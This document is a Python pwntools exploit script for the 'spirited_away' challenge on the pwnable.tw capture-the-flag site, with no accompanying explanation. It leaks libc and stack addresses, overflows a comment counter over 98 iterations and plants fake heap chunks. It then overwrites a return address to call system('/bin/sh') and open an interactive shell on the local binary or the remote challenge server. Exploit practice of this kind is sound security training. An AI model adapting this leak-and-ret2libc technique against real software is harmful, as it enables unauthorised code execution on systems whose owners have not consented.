from pwn import *
# import gdb
# context.log_level = "debug"

debug = 1

if debug:
    p = process('/home/len/pwnable/spirited_away')
    libc = ELF("/home/len/pwnable/glibcs/glibcs/lib/libc.so.6")
    # gdb.attach(p)

else:
    p = remote("chall.pwnable.tw", 10204)
    libc = ELF("./spirited_away_libc_32.so.6")


def input_thing(name, age, reason, comment):
    p.recvuntil("your name: ")
    p.send(name)
    p.recvuntil("your age: ")
    p.sendline(str(age))
    p.recvuntil("see this movie? ")
    p.send(reason)
    p.recvuntil("your comment: ")
    p.send(comment)

    p.recvuntil("Name: ")
    res_name = p.recvuntil("\n")
    p.recvuntil("Age: ")
    res_age = p.recvuntil("\n")
    p.recvuntil("Reason: ")
    res_reason = p.recvuntil("\n")
    p.recvuntil("Comment: ")
    res_comment = p.recvuntil("\n")

    return res_name, res_age, res_reason, res_comment


def _leave_comment():
    p.recvuntil("comment? <y/n>: ")
    p.sendline("y")


comment_num = 0x0804A070
_, _, reason, _ = input_thing("test", 1, "1" * 0x18, "1" * 1)
libc.address = u32(reason[0x18:0x18 + 4]) - 7 - libc.symbols['_IO_file_sync']
print "libc address", hex(libc.address)
_leave_comment()
_, _, reason, _ = input_thing("test", 1, "1" * 0x38, "1" * 1)
_leave_comment()
stack_address = u32(reason[0x38:0x38 + 4]) - 0x20
reason_stack = stack_address - 0x50
print "stack address", hex(stack_address)

for i in range(98):
    name, age, reason, comment = input_thing("1" * 0x3c, 1, "2" * 0x50,
                                             "3" * 0x3c)
    _leave_comment()
    log.success("current time " + str(i))
# set fake chunk
reason_payload = p32(0) + p32(0x41) + "a" * 0x38 + p32(0) + p32(0x41)
comment_payload = "1" * 0x54 + p32(reason_stack + 8) + p32(0) + p32(0x41)
name, age, reason, comment = input_thing("test", 1, reason_payload,
                                         comment_payload)
_leave_comment()

system_address = libc.symbols['system']
bin_sh_address = next(libc.search("/bin/sh\x00"))

payload = "1" * 0x48
payload += "1" * 4 + p32(system_address) + "1" * 4 + p32(bin_sh_address)

p.recvuntil("your name: ")
p.send(payload)
p.recvuntil("your age: ")
p.sendline("1")
p.recvuntil("see this movie? ")
p.send("1")
p.recvuntil("your comment: ")
p.send("1")

p.recvuntil("comment? <y/n>: ")
p.sendline("n")
p.interactive()